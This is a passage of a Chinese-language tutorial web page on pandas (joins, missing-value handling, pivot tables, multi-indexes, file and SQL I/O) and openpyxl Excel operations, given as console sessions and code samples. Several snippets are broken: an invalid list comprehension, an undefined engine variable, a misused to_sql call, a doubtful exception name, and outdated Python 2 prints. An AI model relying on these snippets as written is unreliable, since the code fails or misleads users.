7   Philip     86
8   Robert     73
9  william     77
>>> student3['Name']=['Alfred','Alice','Barbara','Carol']
>>> student3
      Name Sex  Age  Height  weight
0   Alfred   M   27   165.7      61
1    Alice   F   23   167.2      63
2  Barbara   M   27   173.0      61
3    Carol   F   23   167.2      63
# 把学生表和成绩表做一个关联,默认情况下实现的是两个表之间的内连接,即返回两张表中共同部分的数据
>>> stu_score1=pd.merge(student3,score,on='Name')
>>> stu_score1
      Name Sex  Age  Height  weight  Score
0   Alfred   M   27   165.7      61     88
1    Alice   F   23   167.2      63     76
2  Barbara   M   27   173.0      61     89
3    Carol   F   23   167.2      63     67
>>> stu_score1=pd.merge(student3,score,on='Name',how='inner')
>>> stu_score1
      Name Sex  Age  Height  weight  Score
0   Alfred   M   27   165.7      61     88
1    Alice   F   23   167.2      63     76
2  Barbara   M   27   173.0      61     89
3    Carol   F   23   167.2      63     67
# 使用how参数设置连接的方式,left为左连接,right为右连接,outer为外连接
>>> stu_score2=pd.merge(student3,score,on='Name',how='left')
>>> stu_score2
      Name Sex  Age  Height  weight  Score
0   Alfred   M   27   165.7      61     88
1    Alice   F   23   167.2      63     76
2  Barbara   M   27   173.0      61     89
3    Carol   F   23   167.2      63     67
# 保留score表中的所有信息,同时将student3表的信息与之配对,能配多少配多少,对于没有配上的score,将会显示Nan
>>> stu_score3=pd.merge(student3,score,on='Name',how='right')
>>> stu_score3
      Name  Sex   Age  Height  weight  Score
0   Alfred    M  27.0   165.7    61.0     88
1    Alice    F  23.0   167.2    63.0     76
2  Barbara    M  27.0   173.0    61.0     89
3    Carol    F  23.0   167.2    63.0     67
4    Henry  NaN   NaN     NaN     NaN     79
5  Jeffrey  NaN   NaN     NaN     NaN     90
6     Judy  NaN   NaN     NaN     NaN     92
7   Philip  NaN   NaN     NaN     NaN     86
8   Robert  NaN   NaN     NaN     NaN     73
9  william  NaN   NaN     NaN     NaN     77
>>> stu_score4=pd.merge(student3,score,on='Name',how='outer')
>>> stu_score4
      Name  Sex   Age  Height  weight  Score
0   Alfred    M  27.0   165.7    61.0     88
1    Alice    F  23.0   167.2    63.0     76
2  Barbara    M  27.0   173.0    61.0     89
3    Carol    F  23.0   167.2    63.0     67
4    Henry  NaN   NaN     NaN     NaN     79
5  Jeffrey  NaN   NaN     NaN     NaN     90
6     Judy  NaN   NaN     NaN     NaN     92
7   Philip  NaN   NaN     NaN     NaN     86
8   Robert  NaN   NaN     NaN     NaN     73
9  william  NaN   NaN     NaN     NaN     77

对缺失值的处理
现实中的数据存在很多噪音的同时,缺失值也非常的常见。缺失值的存在会影响后期的数据分析或挖掘工作,那么缺失值的处理有哪些方法呢？

删除法
当数据中某个变量大部分值都会缺失值时,可以考虑删除该变量;
当缺失值时随机分布的,且缺失的数量并不是很多时,可以删除这些缺失的观测;
默认情况下,dropna会删除任何含有缺失值的行, 构造个数据框

>>> df=pd.DataFrame([[1,1,2],[3,5,np.nan],[13,21,34],[55,np.nan,10],
...  [np.nan,np.nan,np.nan],[np.nan,1,2]],columns=['x1','x2','x3'])
>>> df
     x1    x2    x3
0   1.0   1.0   2.0
1   3.0   5.0   NaN
2  13.0  21.0  34.0
3  55.0   NaN  10.0
4   NaN   NaN   NaN
5   NaN   1.0   2.0
>>> df.dropna()
     x1    x2    x3
0   1.0   1.0   2.0
2  13.0  21.0  34.0

# 只删除所有行为缺失值的观测
>>> df=pd.DataFrame([[1,1,2],[3,5,np.nan],[13,21,34],[55,np.nan,10],
...  [np.nan,np.nan,np.nan],[np.nan,1,2]],columns=['x1','x2','x3'])
>>> df.dropna(how='all')
     x1    x2    x3
0   1.0   1.0   2.0
1   3.0   5.0   NaN
2  13.0  21.0  34.0
3  55.0   NaN  10.0
5   NaN   1.0   2.0

# 删除有行为缺失值的观测,
>>> df=pd.DataFrame([[1,1,2],[3,5,np.nan],[13,21,34],[55,np.nan,10],
...  [np.nan,np.nan,np.nan],[np.nan,1,2]],columns=['x1','x2','x3'])
>>> df.dropna(how='any')
     x1    x2    x3
0   1.0   1.0   2.0
2  13.0  21.0  34.0

# 删除全为nan的那些列
>>> df=pd.DataFrame([[1,1,2,np.nan],[3,5,np.nan,np.nan],[13,21,34,np.nan],[55,np.nan,10,np.nan],
...  [np.nan,np.nan,np.nan,np.nan],[np.nan,1,2,np.nan]],columns=['x1','x2','x3','x4'])
>>> df
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   NaN NaN
2  13.0  21.0  34.0 NaN
3  55.0   NaN  10.0 NaN
4   NaN   NaN   NaN NaN
5   NaN   1.0   2.0 NaN
>>> df.dropna(how='all',axis=1)
     x1    x2    x3
0   1.0   1.0   2.0
1   3.0   5.0   NaN
2  13.0  21.0  34.0
3  55.0   NaN  10.0
4   NaN   NaN   NaN
5   NaN   1.0   2.0

# 利用thresh,保留一些为nan的值
# 行方向上至少有3个非NAN的项保留
>>> df=pd.DataFrame([[1,1,2,np.nan],[3,5,np.nan,np.nan],[13,21,34,np.nan],[55,np.nan,10,np.nan],
...  [np.nan,np.nan,np.nan,np.nan],[np.nan,1,2,np.nan]],columns=['x1','x2','x3','x4'])
>>> df.dropna(thresh=3)
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
2  13.0  21.0  34.0 NaN
>>> df
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   NaN NaN
2  13.0  21.0  34.0 NaN
3  55.0   NaN  10.0 NaN
4   NaN   NaN   NaN NaN
5   NaN   1.0   2.0 NaN

>>> df=pd.DataFrame([[1,1,2,np.nan],[3,5,np.nan,np.nan],[13,21,34,np.nan],[55,np.nan,10,np.nan],
...  [np.nan,np.nan,np.nan,np.nan],[np.nan,1,2,np.nan]],columns=['x1','x2','x3','x4'])
>>> df.dropna(thresh=1)
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   NaN NaN
2  13.0  21.0  34.0 NaN
3  55.0   NaN  10.0 NaN
5   NaN   1.0   2.0 NaN
>>> df
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   NaN NaN
2  13.0  21.0  34.0 NaN
3  55.0   NaN  10.0 NaN
4   NaN   NaN   NaN NaN
5   NaN   1.0   2.0 NaN

# 在列方向上至少保留有3个非NAN的项保留
>>> df=pd.DataFrame([[1,1,2,np.nan],[3,5,np.nan,np.nan],[13,21,34,np.nan],[55,np.nan,10,np.nan],
...  [np.nan,np.nan,np.nan,np.nan],[np.nan,1,2,np.nan]],columns=['x1','x2','x3','x4'])
>>> df.dropna(thresh=3,axis=1)
     x1    x2    x3
0   1.0   1.0   2.0
1   3.0   5.0   NaN
2  13.0  21.0  34.0
3  55.0   NaN  10.0
4   NaN   NaN   NaN
5   NaN   1.0   2.0
>>> df
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   NaN NaN
2  13.0  21.0  34.0 NaN
3  55.0   NaN  10.0 NaN
4   NaN   NaN   NaN NaN
5   NaN   1.0   2.0 NaN

# 替补法
对于连续变量,如果变量的分布近似或就是正态分布的话,可以用均值替代那些缺失值;
如果变量是有偏的,可以使用中位数来代替那些缺失值;
对于离散型变量,一般使用众数去替换那些存在缺失的预测;

fillna函数的参数：
value:用于填充缺失值的标量值或者字典对象
method:插值方式,如果函数调用时,未指定其他参数的话默认值fill
axis:待填充的轴默认值axis=0
inplace:修改调用这对象而不产生副本
limit:(对于前向和后项填充)可以连续填充的最大数量

使用一个常量来填补缺失值,可以使用fillna函数实现简单的填补工作

1.用0填补所有缺失值
>>> df.fillna(0)
     x1    x2    x3   x4
0   1.0   1.0   2.0  0.0
1   3.0   5.0   0.0  0.0
2  13.0  21.0  34.0  0.0
3  55.0   0.0  10.0  0.0
4   0.0   0.0   0.0  0.0
5   0.0   1.0   2.0  0.0

2.采用前项填充或后项填充,用一个观测值填充
>>> df.fillna(method='ffill')
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   2.0 NaN
2  13.0  21.0  34.0 NaN
3  55.0  21.0  10.0 NaN
4  55.0  21.0  10.0 NaN
5  55.0   1.0   2.0 NaN

用后一个观测值填充--这样会导致最后边的无法填充Nan

>>> df.fillna(method='bfill')
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0  34.0 NaN
2  13.0  21.0  34.0 NaN
3  55.0   1.0  10.0 NaN
4   NaN   1.0   2.0 NaN
5   NaN   1.0   2.0 NaN

3.使用常量填充不同的列
>>> df.fillna({'x1':1,'x2':2,'x3':3})
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0   3.0 NaN
2  13.0  21.0  34.0 NaN
3  55.0   2.0  10.0 NaN
4   1.0   2.0   3.0 NaN
5   1.0   1.0   2.0 NaN

4.使用均值或中位数填充各自的列
>>> x1_median=df['x1'].median()
>>> x2_mean=df['x2'].mean()
>>> x3_mean=df['x3'].mean()
>>> print(x1_median,x2_mean,x3_mean)
8.0 7.0 12.0
>>> df.fillna({'x1':x1_median,'x2':x2_mean,'x3':x3_mean})
     x1    x2    x3  x4
0   1.0   1.0   2.0 NaN
1   3.0   5.0  12.0 NaN
2  13.0  21.0  34.0 NaN
3  55.0   7.0  10.0 NaN
4   8.0   7.0  12.0 NaN
5   8.0   1.0   2.0 NaN

使用填充法时,相对于常数填充或者前项、后项填充,使用各列众数,均值或中位数填充要更加合理些,这也是工作中常用的一个快捷手段

实现excel的数据透视表功能
pivot_table(data,values=None,index=None,columns=None,aggfunc='mean',fill_value=None,margins=False,dropna=True,margins_name='All')
data:需要进行数据透视表操作的数据框
values:指定需要聚合的字段
index:指定某些原始变量作为行索引
columns:指定哪些离散的分组变量
aggfunc:指定相应的聚合函数
fill_value:使用一个常数替代缺失值,默认不替换
margins:是否进行行或列的汇总,默认不汇总
dropna:默认所有观测为缺失的列
margins_name:默认行汇总或列汇总的名称为'ALL

>>> student3 = pd.DataFrame({
...     'Name': ['LiuShunxiang','Zhangshan','Liu','Zhang', 'Lisi'],
...     'Sex': ['M', 'F', 'M', 'F', 'M'],
...     'Age': [27, 23, 27, 23, 25],
...     'Height': [165.7, 167.2, 165.7, 167.2, 170.0],
...     'weight': [61, 63, 61, 63, 65]
... })
>>> student3
           Name Sex  Age  Height  weight
0  LiuShunxiang   M   27   165.7      61
1     Zhangshan   F   23   167.2      63
2           Liu   M   27   165.7      61
3         Zhang   F   23   167.2      63
4          Lisi   M   25   170.0      65

Age作为分组变量,weight作为数值变量做统计汇总
>>> pd.pivot_table(student3,values=['weight'],columns=['Age'])
Age     23  25  27
weight  63  65  61

Age作为1个分组变量,weight,Height作为两个数值变量做统计汇总
>>> pd.pivot_table(student3,values=['weight','Height'],columns=['Age'])
Age        23     25     27
Height  167.2  170.0  165.7
weight   63.0   65.0   61.0

Age,Sex作为2个分组变量,weight作为1个数值变量做统计汇总
>>> pd.pivot_table(student3,values=['weight','Height'],columns=['Age','Sex'])
        Age  Sex
weight  23   F       63.0
        25   M       65.0
        27   M       61.0
Height  23   F      167.2
        25   M      170.0
        27   M      165.7
dtype: float64

这样的结果并不想Excel中预期的那样,该如何变成列联表的形式呢？很简单,只需将结果进行非堆叠操作即可。
>>> pd.pivot_table(student3,values=['weight','Height'],columns=['Age','Sex']).unstack()
Sex             F      M
       Age
weight 23    63.0    NaN
       25     NaN   65.0
       27     NaN   61.0
Height 23   167.2    NaN
       25     NaN  170.0
       27     NaN  165.7

使用多个聚合函数
>>> pd.pivot_table(student3,values=['weight','Height'],columns=['Age'], aggfunc=[np.mean,np.median,np.std])
         mean               median                std
Age        23     25     27     23     25     27   23   27
Height  167.2  170.0  165.7  167.2  170.0  165.7  0.0  0.0
weight   63.0   65.0   61.0   63.0   65.0   61.0  0.0  0.0

</textarea>多层索引的使用<textarea>
Series的多层索引
>>> s=pd.Series([1,2,3,4],index=[['小张','小张','老王','老王'], ['期中','期末','期中','期末']])
>>> s
小张  期中    1
    期末    2
老王  期中    3
    期末    4
dtype: int64

取回最外层索引为'小张'的所有数据
>>> s[['小张']]
小张  期中    1
    期末    2
dtype: int64

取回最内层所有为'期中'的数据
>>> s[:,'期中']
小张    1
老王    3
dtype: int64

将多层次索引的序列转换为数据框的形式
>>> s.unstack()
    期中  期末
小张   1   2
老王   3   4

数据框的多层次索引
构造一个类似的高维数据框
>>> df=pd.DataFrame(np.random.randint(10,50,20).reshape(5,4),
...  index=[['A','A','A','B','B'],[1,2,3,1,2]],
...  columns=[['x','x','x','y'],['x1','x2','x3','y']])
>>> df
      x           y
     x1  x2  x3   y
A 1  35  45  10  38
  2  33  17  24  15
  3  19  43  42  13
B 1  11  47  44  10
  2  34  49  48  25

通过外层索引取出大块数据
>>> df['x']
     x1  x2  x3
A 1  35  45  10
  2  33  17  24
  3  19  43  42
B 1  11  47  44
  2  34  49  48

>>> df.loc[['A'],:]
      x           y
     x1  x2  x3   y
A 1  35  45  10  38
  2  33  17  24  15
  3  19  43  42  13

在数据框中使用多层索引,可以将整个数据集控制在二维表结构中,这对于数据重塑和基于分组的操作(如数据透视表的生成)比较有帮助
以test_data二维数据框为例,构造一个多层索引数据集。

pd.pivot_table(test_data,index=['marital','loan'])

</textarea><pre>
【 IO工具 Pandas导入导出 】
pandas的I/O API是一组read函数,比如pandas.read_csv()函数,这类函数可以返回pandas对象。相应的write函数是像DataFrame.to_csv()一样的对象方法。下面是一个方法列表,包含了这里面的所有readers函数和writer函数

FormatType DataDescription  Reader  Writer
text  CSV read_csv  to_csv
text  JSON  read_json to_json
text  HTML  read_html to_html
text  Local clipboard read_clipboard  to_clipboard
binary  MS Excel  read_excel  to_excel
binary  OpenDocument  read_excel
binary  HDF5 Format read_hdf  to_hdf
binary  Feather Format  read_feather  to_feather
binary  Parquet Format  read_parquet  to_parquet
binary  Msgpack read_msgpack  to_msgpack
binary  Stata read_stata  to_stata
binary  SAS read_sas
binary  Python Pickle Format  read_pickle to_pickle
SQL SQL read_sql  to_sql
SQL Google Big Query  read_gbq  to_gbq

pandas可以读取与存取像csv、excel、json、html、pickle等格式的资料
data=pd.read_csv('test1.csv')  #读取csv文件
data=pd.read_csv("test1.csv",header=None)  # 如果读取的文件没有列名则需要在程序中设置header
data=pd.read_excel("Soils.xls", parse_dates = ['Collection_Date']) # 数据集中有日期时间类型的列就需要设置参数parse_dates = [column_name],以便Pandas可以将该列识别为日期

# # 按块大小读取CSV文件,每次100万行将大型数据集分解成许多小块,产生了一个用于迭代的TextFileReader对象,严格地说df_chunk不是一个dataframe,而是一个用于下一步操作的对象
df_chunk = pd.read_csv(r'../input/data.csv', chunksize=1000000)
# 基本的工作流就是对每个块执行操作,并将它们连接起来,最后形成一个dataframe。通过迭代每个块,在将每个块添加到列表之前,使用一个函数chunk_preprocessing执行数据过滤/预处理。最后将这个列表连接到最终的dataframe中以适应本地内存
chunk_list = []         # append each chunk df here
for chunk in df_chunk:  # Each chunk is in df format
    chunk_filter = chunk_preprocessing(chunk)  # perform data filtering
    chunk_list.append(chunk_filter)            # Once the data filtering is done, append the chunk to list
df_concat = pd.concat(chunk_list)  # concat the list into dataframe

data.to_pickle('test2.pickle') #将资料存取成pickle文件

pandas.read_excel()
依赖： pip install xlrd

pandas.read_excel(io, sheet_name=0, header=0, names=None, index_col=None, usecols=None, squeeze=False, dtype=None, engine=None, converters=None, true_values=None, false_values=None, skiprows=None, nrows=None, na_values=None, keep_default_na=True, verbose=False, parse_dates=False, date_parser=None, thousands=None, comment=None, skip_footer=0, skipfooter=0, convert_float=True, mangle_dupe_cols=True, **kwds)
Read an Excel file into a pandas DataFrame,Support both xls and xlsx file extensions from a local filesystem or URL. Support an option to read a single sheet or a list of sheets

DataFrame.to_excel()
依赖： pip install openpyxl
DataFrame.to_excel(self, excel_writer, sheet_name='Sheet1', na_rep='', float_format=None, columns=None, header=True, index=True, index_label=None, startrow=0, startcol=0, engine=None, merge_cells=True, encoding=None, inf_rep='inf', verbose=True, freeze_panes=None)
Write object to an Excel sheet

导入CSV或者xlsx文件：
df = pd.DataFrame(pd.read_csv('name.csv',header=1))
df = pd.DataFrame(pd.read_excel('name.xlsx'))

</pre><textarea>
import pandas as pd

# 读取excel
data = pd.read_excel('pandas.xlsx', sheet_name='Sheet1')
print(data)
print('打印列:\n', data['subject'])
print('打印前3行:\n', data[:3])
print('打印前3行的前3列:\n', data.iloc[:2, :2])
print('获取工作簿行数和列数:\n', data.shape)

'''
  subject   时间
0   numpy   50
1  pandas   60
2  pillow   45
3     NaN  155
打印列:
 0     numpy
1    pandas
2    pillow
3       NaN
Name: subject, dtype: object
打印前3行:
   subject  时间
0   numpy  50
1  pandas  60
2  pillow  45
打印前3行的前3列:
   subject  时间
0   numpy  50
1  pandas  60
获取工作簿行数和列数:
 (4, 2)
'''

df = pd.DataFrame({
    'id': [1,2,3],
    'name': ['小张', '小刘', '小崔'],
    'address': ['北京', '上海', '深圳']
})
df.to_excel('pandas1.xlsx', sheet_name='Sheet2', index=False) # xlsx文件存在则清空再创建,不存在则直接新建

</textarea>to_csv方法导出的csv在excel打开中文乱码<pre>
import pandas as pd
datas = [{'name':'王小一','age':29,'address':'北京'},{'name':'张小二','age':18,'address':'四川'},{'name':'李小三','age':60,'address':'上海'}]
df = pd.DataFrame(datas)
df.to_csv('person.csv', index=False)

# 这是因为当执行代码df.to_csv('person.csv',index=False)时默认会以UTF-8编码方式写CSV文件。但是双击CSV使用Excel打开时Excel会以GBK编码来读这个文件,这就导致了乱码的发生
df.to_csv('person.csv', index=False, encoding='gbk')

# GBK编码的字符集不够完善,所以如果文本中包含超出GBK字符集的内容如图形文字就会导致编码错误,实际上双击打开CSV的时候,Excel会检查文件的第一个字符,如果这个字符是BOM,那么就知道应该使用UTF-8编码方式来打开这个文件。所谓的BOM指的是byte-order mark。BOM对应的Unicode码为\ufeff,所以使用UTF-8编码方式生成CSV以后,再把BOM写入到文件的第一个字符：

df.to_csv('person.csv', index=False)
with open('person.csv', encoding='utf-8') as f:
    content = f.read()
content_with_bom = '\ufeff' + content
with open('person.csv', 'w', encoding='utf-8') as f:
    f.write(content_with_bom)

</pre><pre>
【 pandas读取数据库 】
用python从数据库读取数据,一般都会使用专门的数据库连接包,然后使用 cursor,比如连接mysql：
import pymysql
conn=pymysql.connect('localhost',port=3306,user='root',passwd=123,db='test')
cursor=conn.cursor()
cursor.execute(sql)
result=cursor.fetchall()
cursor.close()
conn.close()
然后再将result通过pd.DataFrame(list(result))转换成DataFrame。
在返回的数据量很小的情况下,可以直接使用pandas中的read_sql_query读取数据,得到的结果就是DataFrame,省去了从cursor转换为DataFrame。

from sqlalchemy import create_engine
engine = create_engine('mysql+pymysql://user:password@localhost:3306/python?charset=utf8',encoding='utf-8',echo=True)

读取自定义数据(通过SQL语句)
pandas.read_sql_query(sql, con, index_col=None, coerce_float=True, params=None, parse_dates=None,chunksize=None)
data = pd.read_sql_query('select * from t_line ',con = engine)
返回t_line表的DataFrame格式,如有时间列可以parse_dates=[time_column]用于解析时间,并把此列作为索引index_col=[time_column]

read_sql_query()中可以接受SQL语句包括增删改查,DELETE语句会在数据库中执行但不会返回值,UPDATE、SELECT等会返回结果
删除插入更新操作没有返回值,程序会抛出SourceCodeCloseError,并终止程序。如果想继续运行,可以try捕捉此异常。
data = pd.read_sql_query('delete from test_cjk where f_intime = 1309',con = engine),这条语句会执行,但不会返回data。
pd.read_sql_query("insert into cjk_test h values %(data)s",params={'data':v_split[11]},con=engine) 插入操作
pd.read_sql_query("update cjk_test set a='粤11111'  WHERE a='粤B30738'",con =engine)  更新操作
pd.read_sql_query("delete from cjk_test where c='1'",con=engine)  删除操作

读取整张表于DataFrame格式(通过表名)
pd.read_sql_table(table_name, con, schema=None, index_col=None, coerce_float=True, parse_dates=None, columns=None, chunksize=None)
data = pd.read_sql_table(table_name = 't_line',con = engine,parse_dates = 'time',index_col = 'time',columns = ['a','b','c'])

读数据库(通过SQL语句或者表名)
pandas.read_sql()
pandas.read_sql(sql, con, index_col=None, coerce_float=True, params=None, parse_dates=None, columns=None, chunksize=None)
Read SQL query or database table into a DataFrame,read_sql综合了read_sql_table和read_sql_query,所以一般用read_sql就好了,省得再去区别那些东西

sql : string or SQLAlchemy Selectable (select or text object)
要执行的SQL查询或表名。

con : SQLAlchemy connectable (engine/connection) or database string URI
或DBAPI2连接(后备模式),使用SQLAlchemy可以使用该库支持的任何数据库。如果是DBAPI2对象,则仅支持sqlite3。

index_col : string or list of strings, optional, default: None
要设置为索引的列(MultiIndex)。

coerce_float : boolean, default True
尝试将非字符串,非数字对象(如decimal.Decimal)的值转换为浮点,这对SQL结果集很有用。

params : list, tuple or dict, optional, default: None
List of parameters to pass to execute method. The syntax used to pass parameters is database driver dependent. Check your database driver documentation for which of the five syntax styles, described in PEP 249's paramstyle, is supported. Eg. for psycopg2, uses %(name)s so use params={'name' : 'value'}

parse_dates : list or dict, default: None
要解析为日期的列名列表。
在解析字符串时,格式字符串是strftime兼容的格式字符串,或者是(D、s、ns、ms、us),以防解析整型时间戳。
{column_name：arg dict}的字典,其中arg dict对应于pandas.to_datetime()的关键字参数。对于没有本机Datetime支持的数据库(如SQLite)特别有用。

columns : list, default: None
从SQL表中选择的列名列表(仅在读取表时使用)。

chunksize : int, default None
如果指定,则返回一个迭代器,其中chunksize是要包含在每个块中的行数

import pandas as pd
import pymysql
conn=pymysql.connect('localhost',port=3306,user='root',passwd='test',db='test')
result=pd.read_sql(sql,conn)
result=pd.read_sql_query(sql,conn)

通过JDBC查询的方式速度比read_sql更快
import pandas as pd
import sqlalchemy as sql
db_engine=sql.create_engine('oracle://test01:test01@test001db')
conn=ora_engine.raw_connection()
cursor=conn.cursor()
queryset=cursor.execute('select * from my_table1')
columns=[for i[0] in queryset.description]
jdbc_data=queryset.fetchall()
db_df1=pd.DataFrame(
jdbc_data,columns=["A1","B2","C3"])
db_df1.columns=columns
db_df1.append(df_data)

【 pandas写入数据 】
使用cursor写入数据：
for i in result.index:
    cur.execute("insert into test(id,name) values (%s,%s)" ,tuple(result.loc[i]))
conn.commit()

#推荐使用以下方法：
values=[]
for i in person_lable.index:
        values.append(tuple(result.loc[i]))
cur.executemany("insert into test(id,name) values (%s,%s)" ,values)
conn.commit()

DataFrame直接写入到数据库,需要使用sqlalchemy包：
import sqlalchemy
import pymysql
engine = sqlalchemy.create_engine('mysql+pymysql://root:123@localhost:3306/test?charset=utf8')
result.to_sql(result,engine,if_exists='append')

DataFrame.to_sql()
DataFrame.to_sql(name, con, flavor=None, schema=None, if_exists='fail', index=True, index_label=None, chunksize=None, dtype=None)
if_exists有三个参数{'fail', 'replace', 'append'}, 默认'fail';
数据量很大的话可以设置chunksize。

</pre>
</div>

<div id="scikit-learn">
<h4>数据分析之scikit-learn 强大的数据分析建模库</h4><pre>
数据挖掘建模、机器学习

</pre>
</div>

<div id="scikit-keras">
<h4>数据分析之keras 人工神经网络</h4><pre>

</pre>
</div>

<div id="excel">
<h4>openpyxl</h4><pre>
pip install openpyxl

openpyxl是一个开源项目,openpyxl模块是一个读写Excel 2010文档的Python库,如果要处理更早格式的Excel文档,需要用到其它库(如：xlrd、xlwt等),这是openpyxl比较其他模块的不足之处。openpyxl是一款比较综合的工具,不仅能够同时读取和修改Excel文档,而且可以对Excel文件内单元格进行详细设置,包括单元格样式等内容,甚至还支持图表插入、打印设置等内容,使用openpyxl可以读写xltm, xltx, xlsm, xlsx等类型的文件,且可以处理数据量较大的Excel文件,跨平台处理大量数据是其它模块没法相比的。因此,openpyxl成为处理Excel复杂问题的首选库函数。

在使用openpyxl前先要掌握三个对象:
Workbook: 工作簿,一个包含多个Sheet的Excel文件
Worksheet: 工作表,一个Workbook有多个Worksheet,表名识别,如"Sheet1","Sheet2"等
Cell: 单元格,存储具体的数据对象

具体的使用流程是：
1.导入openpyxl模块
2.调用openpyxl.load_workbook()函数或openpyxl.Workbook(),取得Workbook对象。
3.调用get_active_sheet()或get_sheet_by_name()工作簿方法,取得Worksheet对象。
4.使用索引或工作表的cell()方法,带上row和column关键字参数,取得Cell对象,读取或编辑Cell对象的value属性。

</pre><textarea>
### 新建空的excel
import openpyxl
wb = openpyxl.Workbook() # 作成一个新的空的Excel
wb.save('example.xlsx')  # 保存

### 创建一个excel文件,并写入不同类的内容
from openpyxl import Workbook
wb = Workbook()         # 创建文件对象
ws = wb.active          # 获取第一个sheet,grab the active worksheet
ws['A1'] = 42           # 写入数字,Data can be assigned directly to cells
ws['B1'] = "你好"+"automation test" #写入中文(unicode中文也可)
ws.append([1, 2, 3])    # Rows can also be appended,写入多个单元格
# Python types will automatically be converted
import datetime
import time
ws['A2'] = datetime.datetime.now()     # 写入一个当前时间
ws['A3'] = time.strftime("%Y年%m月%d日 %H时%M分%S秒",time.localtime()) # 写入一个自定义的时间格式
wb.save("e:\\sample.xlsx")             # Save the file

### 创建sheet
from openpyxl import Workbook
wb = Workbook()
ws1 = wb.create_sheet("Mysheet")           # 创建一个sheet
ws1.title = "New Title"                    # 设定一个sheet的名字
ws2 = wb.create_sheet("Mysheet", 0)        # 设定sheet的插入位置 默认插在后面
ws2.title = u"你好"                        # 设定一个sheet的名字 必须是Unicode
ws1.sheet_properties.tabColor = "1072BA"   # 设定sheet的标签的背景颜色

# 获取某个sheet对象
print wb.get_sheet_by_name(u"你好")
print wb["New Title" ]

# 获取全部sheet的名字,遍历sheet名字
print wb.sheetnames
for sheet_name in wb.sheetnames:
    print sheet_name

print "*"*50

for sheet in wb:
    print sheet.title

#复制一个sheet
wb["New Title" ]["A1"]="zeke"
source = wb["New Title" ]
target = wb.copy_worksheet(source)

# w3 = wb.copy_worksheet(wb['new title'])
# ws3.title = 'new2'
# wb.copy_worksheet(wb['new title']).title = 'hello'
# Save the file
wb.save("e:\\sample.xlsx")

### 操作单元格
from openpyxl import Workbook
wb = Workbook()
ws1 = wb.create_sheet("Mysheet")           #创建一个sheet
ws1["A1"]=123.11
ws1["B2"]="你好"
d = ws1.cell(row=4, column=2, value=10)
print ws1["A1"].value
print ws1["B2"].value
print d.value
wb.save("e:\\sample.xlsx")  # Save the file

### 操作批量的单元格
无论ws.rows还是ws.iter_rows都是一个对象
除上述两个对象外 单行,单列都是一个元祖,多行多列是二维元祖

from openpyxl import Workbook
wb = Workbook()
ws1 = wb.create_sheet("Mysheet")           #创建一个sheet
ws1["A1"]=1
ws1["A2"]=2
ws1["A3"]=3
ws1["B1"]=4
ws1["B2"]=5
ws1["B3"]=6
ws1["C1"]=7
ws1["C2"]=8
ws1["C3"]=9

#操作单列
print ws1["A"]
for cell in ws1["A"]:
    print cell.value

#操作多列,获取每一个值
print ws1["A:C"]
for column in ws1["A:C"]:
    for cell in column:
        print cell.value

#操作多行
row_range = ws1[1:3]
print row_range
for row in row_range:
    for cell in row:
        print cell.value

print "*"*50
for row in ws1.iter_rows(min_row=1, min_col=1, max_col=3, max_row=3):
    for cell in row:
        print cell.value

#获取所有行
print ws1.rows
for row in ws1.rows:
    print row

print "*"*50
#获取所有列
print ws1.columns
for col in ws1.columns:
    print col

wb.save("e:\\sample.xlsx")

### 使用百分数
from openpyxl import Workbook
from openpyxl import load_workbook
wb = load_workbook('e:\\sample.xlsx')
wb.guess_types = True
ws=wb.active
ws["D1"]="12%"
print ws["D1"].value

# Save the file
wb.save("e:\\sample.xlsx")
#结果会打印小数

### demo
from openpyxl import Workbook
from openpyxl import load_workbook
wb = load_workbook('e:\\sample.xlsx')
wb.guess_types = False
ws=wb.active
ws["D1"]="12%"
print ws["D1"].value
wb.save("e:\\sample.xlsx")
#结果会打印百分数

### 获取所有的行对象：
from openpyxl import Workbook
from openpyxl import load_workbook
wb = load_workbook('e:\\sample.xlsx')
ws=wb.active
rows=[]
for row in ws.iter_rows(): rows.append(row)
print rows   #所有行
print rows[0] #获取第一行
print rows[0][0] #获取第一行第一列的单元格对象
print rows[0][0].value #获取第一行第一列的单元格对象的值

print rows[len(rows)-1] #获取最后行 print rows[-1]
print rows[len(rows)-1][len(rows[0])-1] #获取第后一行和最后一列的单元格对象
print rows[len(rows)-1][len(rows[0])-1].value #获取第后一行和最后一列的单元格对象的值

### 获取所有的列对象：
from openpyxl import Workbook
from openpyxl import load_workbook
wb = load_workbook('e:\\sample.xlsx')
ws=wb.active
cols=[]
cols = []
for col in ws.iter_cols(): cols.append(col)
print cols   #所有列
print cols[0]   #获取第一列
print cols[0][0]   #获取第一列的第一行的单元格对象
print cols[0][0].value   #获取第一列的第一行的值

print "*"*30
print cols[len(cols)-1]   #获取最后一列
print cols[len(cols)-1][len(cols[0])-1]   #获取最后一列的最后一行的单元格对象
print cols[len(cols)-1][len(cols[0])-1].value   #获取最后一列的最后一行的单元格对象的值

### 操作已经存在的文件
from openpyxl import Workbook
from openpyxl import load_workbook
wb = load_workbook('e:\\sample.xlsx')
wb.guess_types = True   #猜测格式类型
ws=wb.active
ws["D1"]="12%"
print ws["D1"].value

# Save the file
wb.save("e:\\sample.xlsx")
#注意如果原文件有一些图片或者图标,则保存的时候可能会导致图片丢失

### 单元格类型
from openpyxl import Workbook
from openpyxl import load_workbook
import datetime
wb = load_workbook('e:\\sample.xlsx')

ws=wb.active
wb.guess_types = True

ws["A1"]=datetime.datetime(2010, 7, 21)
print ws["A1"].number_format

ws["A2"]="12%"
print ws["A2"].number_format

ws["A3"]= 1.1
print ws["A4"].number_format

ws["A4"]= "中国"
print ws["A5"].number_format
# Save the file
wb.save("e:\\sample.xlsx")
执行结果：
yyyy-mm-dd h:mm:ss
0%
General
General
#如果是常规,显示general,如果是数字,显示'0.00_ ',如果是百分数显示0%
数字需要在Excel中设置数字类型,直接写入的数字是常规类型

### 使用公式
from openpyxl import Workbook
from openpyxl import load_workbook
